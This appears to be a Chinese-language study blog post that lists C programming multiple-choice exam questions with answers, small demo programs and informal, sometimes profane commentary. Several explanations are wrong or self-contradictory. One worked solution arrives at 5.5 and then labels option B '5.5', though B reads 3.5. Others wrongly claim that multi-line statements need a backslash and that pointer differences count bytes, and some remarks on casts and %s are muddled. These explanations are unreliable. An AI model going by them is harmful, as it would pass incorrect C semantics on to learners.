<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关于C语言的源程序的叙述中,错误的是(C)</span><br><span class="line">A.C语言的源程序由函数构成</span><br><span class="line">B.main函数可以书写在自定义函数之后</span><br><span class="line">C.必须包含有输入语句</span><br><span class="line">D.一行可以书写多个语句</span><br></pre></td></tr></table></figure>

<p> C语言的源程序并不一定要包含输入语句。不同的程序可能具有不同的输入方式，如从命令行参数读取、从文件中读取等。</p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9.下面叙述中，（A）不是结构化程序设计中的三种基本结构之一</span><br><span class="line">A.数据结构  B.选择结构   C.循环结构    D.顺序结构</span><br></pre></td></tr></table></figure>

<p>结构化程序设计的三中基本语句：<strong>顺序结构，选择结构（分支结构），循环结构</strong></p>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.char 型变量存放的是（A）</span><br><span class="line">A.ASCⅡ码值</span><br><span class="line">B.字符本身</span><br><span class="line">C十进制代码值</span><br><span class="line">D十六进制代码值</span><br></pre></td></tr></table></figure>

<p>c语言中,<em>char型数据是“ASCII码”形式存储的</em></p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11.已有如下定义和输入语句</span><br><span class="line">int a; char c1,c2;</span><br><span class="line">scanf(“%d，%c，%c”, ＆a, ＆c1, ＆c2);</span><br><span class="line">若要求a、c1、c2的值分别为10、A和B，正确的数据输入是（ B ）</span><br><span class="line">A．10AB</span><br><span class="line">B．10,A,B</span><br><span class="line">C．10A  B</span><br><span class="line">D．10  AB</span><br></pre></td></tr></table></figure>

<p>注意哈，由于scanf里面存在逗号，所以这道题才选B。</p>
<p><img src="/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/image-20230902214050568.png" alt="image-20230902214050568"></p>
<p>如果scanf没有逗号的话就选A</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//实例程序</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a; <span class="keyword">char</span> c1, c2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot; %d,%c,%c&quot;</span>, &amp;a, &amp;c1, &amp;c2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n%c\n%c&quot;</span>, a, c1, c2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12.以下叙述不正确的是（ D ）</span><br><span class="line">A、C程序的执行总是从main函数开始</span><br><span class="line">B、一个C源程序必须包含一个main函数</span><br><span class="line">C、C语言程序的基本组成单位是函数</span><br><span class="line">D、在编译C程序源程序时，可发现注释中的拼写</span><br></pre></td></tr></table></figure>

<p>A. C程序的执行总是从 <code>main</code> 函数开始，<code>main</code> 函数是程序的入口。 </p>
<p>B. 一个C源程序必须包含一个 <code>main</code> 函数，因为程序的执行从 <code>main</code> 函数开始。 </p>
<p>C. C语言程序的基本组成单位是函数，C程序是由多个函数组成的。</p>
<p>D. 编译C程序时不会检查注释中的拼写。注释是用来提供对代码的说明和解释，编译器在编译阶段会忽略注释，不对其进行处理。</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13.已知如下定义和输入语句：</span><br><span class="line">int a, b;</span><br><span class="line">scanf (“%d, %d”，＆a, ＆b);</span><br><span class="line">若要求a、b的值分别为10和20，正确的数据输入是（B）</span><br><span class="line">A、10  20</span><br><span class="line">B、10，20</span><br><span class="line">C、a=10, b=20</span><br><span class="line">D、10；20</span><br></pre></td></tr></table></figure>

<p>还是一样的，<code>scanf</code>里面存在逗号。</p>
<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">14、在C语言源程序中，以下叙述正确的是（C）</span><br><span class="line">A、main函数必须位于文件的开头</span><br><span class="line">B、每行只能写一条语句</span><br><span class="line">C、程序中的每一语句可以写成几行</span><br><span class="line">D、每个语句的最后必须有点号</span><br></pre></td></tr></table></figure>

<p>A.<code>main</code>不一定非要在开头</p>
<p>B.每行可以写多条语句</p>
<p>C. 正确，C语言中的语句可以跨越多行书写。使用反斜线（\）来表示下一行是当前语句的延续。这种写法可以提高代码的可读性。</p>
<p>D. 每个语句的最后必须有分号（;）而不是点号。分号用来表示语句的结束。</p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15.对于C语言源程序,以下叙述错误的是( C )</span><br><span class="line">A.可以有空语句</span><br><span class="line">B.函数之间是平等的,在一个函数内部不能定义其它函数</span><br><span class="line">C.程序调试时如果没有提示错误,就能得到正确结果</span><br><span class="line">D.注释可以出现在在语句的前面</span><br></pre></td></tr></table></figure>

<p>1.可以有空语句，即只包含一个分号的语句。它们在某些情况下可能是有用的，例如在某个条件下不需要执行任何操作。</p>
<p>2.在C语言中，函数是独立的代码块，不能在函数内部定义其他函数。函数的定义必须是独立于其他函数之外的。 </p>
<p>3.c语言的函数不可以嵌套定义</p>
<p>4.注释可以出现在语句的前面。C语言中，注释是用来给代码添加说明、解释和注解的，编译器在编译时会忽略注释。</p>
<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16．下面叙述中，（A）不是结构化程序设计三种基本结构的共同特点</span><br><span class="line">Ａ．先判断后执行</span><br><span class="line">Ｂ．单入口，单出口，</span><br><span class="line">Ｃ．程序中没有执行不到的语句</span><br><span class="line">Ｄ．无死循环</span><br></pre></td></tr></table></figure>

<p>A. 先判断后执行并不是结构化程序设计三种基本结构（顺序结构、选择结构、循环结构）的共同特点。先判断后执行是指在执行某一代码块之前进行条件判断，根据判断结果决定是否执行。这是选择结构（if语句）的特点，不适用于其他两种结构。</p>
<p>B. 单入口，单出口是结构化程序设计三种基本结构的共同特点。这表示程序的执行都从一个确定的入口（如main函数）开始，并且从该入口输出结果，只有一个出口。</p>
<p>C. 程序中没有执行不到的语句是结构化程序设计的特点，保证所有的代码都能被执行到。这也是为了避免程序中出现悬挂语句或无效代码。</p>
<p>D. 无死循环也是结构化程序设计的特点，避免程序陷入无限循环而无法退出。</p>
<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17.若有定义:int x=1234,y=123,z=12;则语句printf(“%4d+%3d+%2d”,x,y,z);运行后的输出结果为(D)</span><br><span class="line"></span><br><span class="line">A.123412312</span><br><span class="line">B. 12341234123412341231231231212  </span><br><span class="line">C.1234+1234+1234</span><br><span class="line">D.1234+123+12</span><br></pre></td></tr></table></figure>

<p>根据printf函数的格式化字符串”%4d+%3d+%2d”，它指定了输出3个整数，并且左对齐输出，总宽度分别为4、3和2个字符。</p>
<h1 id="数据类型，运算符和表达式"><a href="#数据类型，运算符和表达式" class="headerlink" title="数据类型，运算符和表达式"></a>数据类型，运算符和表达式</h1><h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、若定义：int x=2; y=3; float i； 则以下符合C语言语法的表达式是（B）</span><br><span class="line">A、x=x*3=2</span><br><span class="line">B、x=(y==1)</span><br><span class="line">C、i=float(x)</span><br><span class="line">D、i%(-3)</span><br></pre></td></tr></table></figure>

<p>D.在C语言中,取余操作符(%)的操作数只能是整型</p>
<p>B. 表达式 “x = (y == 1)” 中括号内的表达式 “y == 1” 是一个条件表达式，返回一个布尔值（真或假），然后将布尔值赋给整数变量 x，这是符合C语言的语法。</p>
<p>？这道题我不知道C错哪了，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">2</span>, y = <span class="number">3</span>; <span class="keyword">float</span> i;</span><br><span class="line">    i = <span class="keyword">float</span>(x);</span><br><span class="line">    x = (y == <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//这jb也没报错啊我草，这些c语言老师不会出题就别出可以吗。</span></span><br></pre></td></tr></table></figure>

<h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、若有定义：int a=5, b=2, c=1；则表达式a-b&lt;c||b==c的值是（A）</span><br><span class="line">A、0   B、1   C、2   D、-1</span><br></pre></td></tr></table></figure>

<p>很简单的一道题，左右条件都为假，中间那个是逻辑或。</p>
<p>逻辑或运算符的短路特性是，只要在整个表达式中发现了一个为真的条件，就不再继续计算剩下的表达式。<strong>也就是一个为真结果就为真</strong></p>
<h2 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、若有68定义：float x=3.5; int z=8; 则表达式x+z%3/4的值是（B）</span><br><span class="line">A、3.75   B、3.5   C、3   D、4</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据给定的定义：float x=3.5; int z=8; 我们计算表达式x+z%3/4的值。</span><br><span class="line">首先，根据运算符的优先级，我们先计算取余运算 z%3：</span><br><span class="line">z%3 = 8%3 = 2 （8除以3的余数）</span><br><span class="line">然后，我们计算3除以4的结果：</span><br><span class="line">3/4 = 0 （这里由于除法运算涉及到整数，因此结果会取整数部分）</span><br><span class="line">最后，我们将结果2加上浮点数 x 的值：</span><br><span class="line">2+3.5=5.5</span><br><span class="line">因此，表达式x+z%3/4的值是5.5。</span><br><span class="line">所以，正确答案是选项 B. 5.5。</span><br></pre></td></tr></table></figure>

<h2 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.若有定义：int a=1，b=2，c=3；语句++a||++b＆＆++a运行后b	的值为（C）</span><br><span class="line">A．1       B.0      C.2       D.3</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/image-20230903080250291.png" alt="image-20230903080250291"></p>
<p>可以看到这个逻辑与和逻辑或都是从左到右的，然后看逻辑或的短路特性，一个为真就不会执行接下来的东西了。</p>
<p>由于第一个操作数的结果为真（非零），整个表达式的结果也为真（非零），此时不会再执行后续的操作。</p>
<p>所以最后b的值依然是2.</p>
<h2 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9.对于整型变量x，下述计语句（B）与赋值句：x=x%2==0?1:0;不等价</span><br><span class="line">A.if（x%2！=0）x=0；else x=1；</span><br><span class="line">B.if（x%2）x=1；else x=0；</span><br><span class="line">C.if（x%2= =0）x=1；else x=0；</span><br><span class="line">D.if（x%2==1） x=0；else x=1；</span><br></pre></td></tr></table></figure>

<p>这个很简单啊，我加上括号就好了<code>x=(x%2==0?1:0);</code></p>
<p>这样理解，然后如果x对2取余，结果为0，x的值就是1.</p>
<h2 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12.下面语句正确的是（ B  C ）</span><br><span class="line">A.int *P；*P=20;</span><br><span class="line">B.char *s=“abcdef”；printf（“%s\n”,s）;</span><br><span class="line">C.char str[]=“abcdf”；</span><br><span class="line">printf（“%s”,str）；</span><br><span class="line">D.char str[]=&#123;‘a’,’b’,’c’&#125;;printf(“%s”,str);</span><br></pre></td></tr></table></figure>

<p>A.在代码中，定义了一个整型指针变量 P，但是没有为其分配内存空间。</p>
<p>然后，执行了 <code>*P = 20;</code> 这个语句，它会尝试将一个值赋给未初始化的指针 P 所指向的内存地址。</p>
<p>由于指针 P 没有被正确初始化，它的值是不确定的，可能指向的是未分配的内存地址，因此这段代码是有严重错误的。</p>
<p>这样的操作可能导致程序出现未定义的行为，比如崩溃或错误的结果。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* P;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">20</span>;</span><br><span class="line">    P = &amp;num;</span><br><span class="line">    *P = <span class="number">20</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, *P);  <span class="comment">// 输出 20</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//这才是A的正确答案</span></span><br></pre></td></tr></table></figure>

<p>D。在 <code>%s</code> 的格式控制符中，需要传入指向字符串的指针。而不是传入一个数组的指针。</p>
<p>反正答案都输选B,那就bbbbbb。</p>
<p>不是，我就搞不懂了，这些b题为啥我有些就是编译报错呢。</p>
<h2 id="7-1"><a href="#7-1" class="headerlink" title="7"></a>7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13.若有定义:intａ＝２；则正确的赋值表达式是（Ａ）</span><br><span class="line">Ａ.ａ- =(a*3)      B.double(-a)     C.a*    D.a*4=3</span><br></pre></td></tr></table></figure>

<p>这个不多解释，其他都不是正常的赋值语句好吧。</p>
<p>A最后结果是，-4</p>
<h2 id="8-1"><a href="#8-1" class="headerlink" title="8"></a>8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15.对于基类型相同的两个指针变量之间，不能进行的运算是（C）</span><br><span class="line">A.＜      B.＝      C.﹢      D.﹣</span><br></pre></td></tr></table></figure>

<p>选项 A 的 “&lt;” 运算符表示比较两个指针的值的大小关系，选项 B 的 “=” 运算符用于指针的赋值，选项 D 的 “－” 运算符用于计算两个指针之间的距离。</p>
<p> “+ “ 运算符在指针之间进行运算是非法的。指针的相加操作是未定义的行为</p>
<h2 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">16.若有定义:int a;则语句a=(3*4)+2%3;运行后a的值为(B)</span><br><span class="line">A. 12        B.14     C.11        D.17</span><br></pre></td></tr></table></figure>

<p>这个不多说，前面是12，后面是2，加起来14</p>
<h2 id="10-1"><a href="#10-1" class="headerlink" title="10"></a>10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">17.下面叙述中,错误的是(A)</span><br><span class="line">A.其算术运算对象不包含函数</span><br><span class="line">B.%(模拟运算符)的运算对象只能为整型量</span><br><span class="line">C.算术运算的结合方向是“自左向右”</span><br><span class="line">D.自加和自减运算符的结合方向是“自右向左”</span><br></pre></td></tr></table></figure>

<p>A.是错误的。算术运算可以应用于包含函数的算术运算对象，只要在运算之前将函数计算为相应的值。在确保函数的返回值具有适当的类型后，可以将其用作算术运算的操作数。例如，可以将函数的返回值与其他操作数进行加法或乘法运算。</p>
<p>D.自加 (++) 和自减 (–) 运算符的结合方向是从右到左。这意味着如果同时存在多个自加或自减运算符，则从最右边的运算符开始逐个执行。</p>
<h2 id="11-1"><a href="#11-1" class="headerlink" title="11"></a>11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">18.已知int a=‘R’；则正确的表达式是（A）</span><br><span class="line">A.a%10</span><br><span class="line">B.a=int（3e2）</span><br><span class="line">C .2＊a=a++</span><br><span class="line">D.a=a+a=a+3</span><br></pre></td></tr></table></figure>

<p>B选项中，使用C++风格的强制类型转换语法 <code>(int)</code>，的确在一些编译器中是可以编译通过的，但这并不符合C语言的标准。在C语言中，应该使用C风格的强制类型转换语法 <code>(int)</code>。</p>
<h2 id="12-1"><a href="#12-1" class="headerlink" title="12"></a>12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20.以下的计语句中,x的值一定被重新赋值的是(B)</span><br><span class="line">A.if(x==y) x+=y;</span><br><span class="line">B if(x＞y＆＆x!=y);x+=y;  </span><br><span class="line">C.if(x!=y) scanf(“%d”,＆x) else scanf(“%d”,＆y);</span><br><span class="line">D.if（x＜y） &#123;x++；y++&#125;</span><br></pre></td></tr></table></figure>

<p>B if(x＞y＆＆x!=y);x+=y; 关键是中间有个;号, 导致if语句对后面的那个语句不起作用.这样考眼力的题目没什么意思（笑死我了）</p>
<h2 id="13-1"><a href="#13-1" class="headerlink" title="13"></a>13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21.设有double型变量a，b，c，e均有值，对代数式（3ae）/（bc），不正确的语言表达式是（C）</span><br><span class="line">A.a/b/c*e*3         B.3*a*e/b/c        C.3*a*e/b*c       D.a*e/c/b*3</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/image-20230903090942744.png" alt="image-20230903090942744"></p>
<p>加减乘除都是从左到右，先计算乘除取余。</p>
<p>所以c其实指的是（3aec）/（b）</p>
<h2 id="14-1"><a href="#14-1" class="headerlink" title="14"></a>14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22.以下运算符中优先级最高的是(D)</span><br><span class="line">A.＞           B.||          C.＆＆          D.+</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/11/C%E8%AF%AD%E8%A8%80%E5%8D%95%E9%80%89%E9%A2%98%E9%A2%98%E5%BA%93%E6%80%BB%E7%BB%93/image-20230903091125126.png" alt="image-20230903091125126"></p>
<p>记住，大于在加后面，剩下两个优先级其实很低。</p>
<h2 id="15-1"><a href="#15-1" class="headerlink" title="15"></a>15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23.若有自定义:int a,b;double x.,则以下不符合C语言的表达是(A)</span><br><span class="line">A.x%(-3)       B.a+=-2</span><br><span class="line">C.a=b=2         D.x=a+b</span><br></pre></td></tr></table></figure>

<p>取余的操作只能作用于整数</p>
<h2 id="16-1"><a href="#16-1" class="headerlink" title="16"></a>16</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">24.若有定义:int a[3] [3];则表达式＆a[2][1]-a的值为(A)</span><br><span class="line">A.7      B.8        C.6        D.9</span><br></pre></td></tr></table></figure>

<p>二维数组其实也是线性存储，题目中的减号之前也提到过，计算的是两个内存地址相差的数量。a指的是首字母的地址。 </p>
<p>这里每一行是三个元素，<code>a[2][1]</code>在第三行第一个，中间就是查了1+3+3个元素，所以选7.</p>
<p>（什么狗题，明明int是四个字节，应该是7*4=28才对。。）</p>
<h2 id="17-1"><a href="#17-1" class="headerlink" title="17"></a>17</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">25.以下（D）是正确的变量名</span><br><span class="line">A.a.bee      B.-P11</span><br><span class="line">C.int      D.P＿11</span><br></pre></td></tr></table></figure>

<p>变量名只能由字母和下划线和数组组成，然后只能由字母和下划线开头。不能和关键字重复。</p>
<h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">26.若有定义：int a=1，b=2 ，c=3，d=4，x=5，y=6 则表达式（x=a＞b）＆＆（y=c＞b）的值为（A）</span><br><span class="line">A.0      B.1     C.  5    D.6</span><br></pre></td></tr></table></figure>

<p>这个更简单，判断一下即可，x是假，y是真。一个真一个假的逻辑或，一假即为假。</p>
<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">27.以下（D）是正确变量名</span><br><span class="line">A.5f     B.if    C.f.5    D._f5</span><br></pre></td></tr></table></figure>

<p>变量名必须以字母或下划线 <code>_</code> 开头，后面可以跟着字母、数字或下划线。它也不能是C语言的关键字。</p>
<h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">28.若有定义：int x=3，y=4，z=5 则值为0的表达式是（D）</span><br><span class="line">A.‘x’＆＆‘y’</span><br><span class="line">B. x＜=y</span><br><span class="line">C. x||y=z＆＆y-z</span><br><span class="line">D. ！（（x＜y）＆＆！z||1）</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">3</span>, y = <span class="number">4</span>, z = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> test = !((x &lt; y) &amp;&amp; !z || <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, test);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//返回值为0</span></span><br></pre></td></tr></table></figure>

<p>取非<code>!</code>在逻辑与或的前面，</p>
<p>所以先计算最右边的！，<code>!z || 1</code>这个表达式就是1，因为逻辑或有一真即为真，然后左边<code>(x &lt; y)</code>是真的，括在一起，两个真的逻辑与，真。最后对这个<code>!(ture)</code>最后就是假，所以输出为0</p>
<h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">29.若有定义：int x,a；则语句x=(a=3,a+1)；运行后x、a的值依次为（ C ）</span><br><span class="line">A．3，3		B．4，4</span><br><span class="line">C．4，3		D．3，4</span><br></pre></td></tr></table></figure>

<p>在这个语句中，我们使用了逗号操作符 <code>,</code>。逗号操作符可以用来在一个表达式中使用多个子表达式，并且每个子表达式都会被依次计算，但最终的结果是最后一个子表达式的值。</p>
<p>首先，<code>a = 3</code> 将 <code>a</code> 的值设置为 3。然后，<code>a + 1</code> 计算出 4，这个值被赋给了 <code>x</code>。所以最终的结果是 <code>x = 4</code> 和 <code>a = 3</code>。</p>
<h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">30.若有定义：int a,b；则表达式(a=2,b=5,a*2,b++,a+b)的值是（ B ）</span><br><span class="line">A．7		B．8		C．9		D．10</span><br></pre></td></tr></table></figure>

<p>从左往右执行哈，a=2,b=5，然后b加了一个，b=6，最后a+b=8</p>
<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">31.若有定义：int a=2,b=3;float x=3.5,y=2.5;则表达式(float)(a+b)/2+(int)x%(int)y的值是（A）</span><br><span class="line">A．3.5		B．3.0</span><br><span class="line">C．2.5		D．2.0</span><br></pre></td></tr></table></figure>

<p>计算顺序应该是<code>(float)(a+b)/2</code>然后再加上<code>(int)x%(int)y</code></p>
<p>(5/2)+(3%2)=3.5</p>
<h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32. 以下（B）是错误的整型常量</span><br><span class="line">A、-0xcdf    B、018    C、0xe    D、011</span><br></pre></td></tr></table></figure>

<p>当数字以0开头时，C语言将其解释为八进制数。在八进制表示中，有效数字的范围是0到7。因此，八进制常量的每个数字都必须在0到7之间。</p>
<p>在选项B中，常量是018。这个常量的第一个数字是0，表示八进制。接下来的数字1是有效的，但是后面的8超出了八进制的范围。因此，018是错误的整型常量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在C语言中，整型常量遵循特定的规则。它们可以是十进制、八进制或十六进制的表示形式。</span><br><span class="line">以0为前缀表示八进制数，以0x或0X为前缀表示十六进制数。</span><br><span class="line"></span><br><span class="line">选项 A. -0xcdf 是正确的十六进制负数常量；</span><br><span class="line">选项 B. 018 是错误的，因为0后面不能紧跟非零数字的八进制常量表示；</span><br><span class="line">选项 C. 0xe 是正确的十六进制常量；</span><br><span class="line">选项 D. 011 是正确的八进制常量。</span><br></pre></td></tr></table></figure>

<h2 id="25"><a href="#25" class="headerlink" title="25"></a>25</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">33.语句a=(3/4)+3%2; 运行后，a的值为（B）</span><br><span class="line">A、0     B、1    C、2     D、3</span><br></pre></td></tr></table></figure>

<p>首先，我们计算表达式 <code>(3 / 4)</code>。在整数除法中，如果除法的结果不能整除，则舍去小数部分。因此，<code>3 / 4</code> 的结果为 0。</p>
<p>然后，我们计算表达式 <code>3 % 2</code>，它代表取余运算。3 除以 2 的余数为 1。</p>
<h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">34.设整形变量a为5， 使b不为2的表达式是（C）</span><br><span class="line">A、b=(++a)/3     B、b=6-(--a)</span><br><span class="line">C、b=a%2      D、b=a/2</span><br></pre></td></tr></table></figure>

<p>C选项明显b是1</p>
<h2 id="27"><a href="#27" class="headerlink" title="27"></a>27</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">35、已知char a=’R’；则正确的赋值表达式是（A）；</span><br><span class="line">A、a=(a++)% 4    B、a+2=3</span><br><span class="line">C、c a+=256--  D、a=‘\078’</span><br></pre></td></tr></table></figure>

<p>a是char类型的数据，但是在c语言中，char也被当做是int类型存储，所以可以进行取余操作。</p>
<p>D:当数字以0开头时，C语言将其解释为八进制数。在八进制表示中，有效数字的范围是0到7。</p>
<h2 id="28"><a href="#28" class="headerlink" title="28"></a>28</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">36.下面叙述正确的是（B）</span><br><span class="line">A、2/3与2.0/3.0等价    B、（int）2.0/3与2/3等价</span><br><span class="line">C、++5与6等价        D、‘A’与“A”等价</span><br></pre></td></tr></table></figure>

<p>C. ++5与6等价：这个叙述是不正确的。<code>++5</code>是错误的语法，<code>++</code>是一个递增运算符，应该与变量一起使用。而6是一个字面常量，不是一个变量，不能与<code>++</code>运算符一起使用。</p>
<p>D. ‘A’与“A”等价：这个叙述是不正确的。‘A’是一个字符常量，表示一个字符A；而“A”是一个字符串常量，表示一个包含一个字符A的字符串。</p>
<h2 id="29"><a href="#29" class="headerlink" title="29"></a>29</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">37、getchar(  )函数的功能是从终端输入（D）</span><br><span class="line">A、一个整型量值   B、一个实型变量值</span><br><span class="line">C、多个字符   D、一个字符</span><br></pre></td></tr></table></figure>

<p><code>getchar()</code>函数是C语言中的标准库函数，它用于从标准输入（终端）获取单个字符，并返回该字符的ASCII值（整数)</p>
<h2 id="30"><a href="#30" class="headerlink" title="30"></a>30</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">38、若有定义：int i=7, j=8; 则表达式 i &gt;j||i&lt;j的值为（A）</span><br><span class="line">A、1      B、变量i的值</span><br><span class="line">C、0     D、变量j的值</span><br></pre></td></tr></table></figure>

<p>逻辑或运算符 || 的运算顺序是从左向右。</p>
<p>而且这个逻辑或，只要有一个真就是真的，所以选a啦</p>
<h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">39、若有定义：int i ，j；则表达式（i=2, j=5, i++, i+j++）的值是（B）</span><br><span class="line">A、7     B、8</span><br><span class="line">C、9       D、10</span><br></pre></td></tr></table></figure>

<p>3+5,括号的顺序是从左往右的</p>
<h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40.若希望当a的值为奇数时,表达式的值为”真”,a的值为偶数时,表达式的值为”假”.则不能满足要求的表达式是( C ) </span><br><span class="line">A.a%2==1    B.!(a%2==0)</span><br><span class="line">C.!(a%2)     D.a%2</span><br></pre></td></tr></table></figure>

<p>c括号里面本来是满足的，加了个！就相反了。</p>
<h2 id="33"><a href="#33" class="headerlink" title="33"></a>33</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">41．下面叙述正确的是（　A　）</span><br><span class="line">　Ａ．强制类型转换运算的优先级高于算术运算</span><br><span class="line">　Ｂ．若a和b是整型变量，(a+b)++是合法的</span><br><span class="line">　Ｃ．”A”*＇B＇是合法的</span><br><span class="line">　Ｄ．＂A＂+＂B＂是合法的</span><br></pre></td></tr></table></figure>

<p>在C语言中，强制类型转换运算符<code>(type)</code>具有较高的优先级.</p>
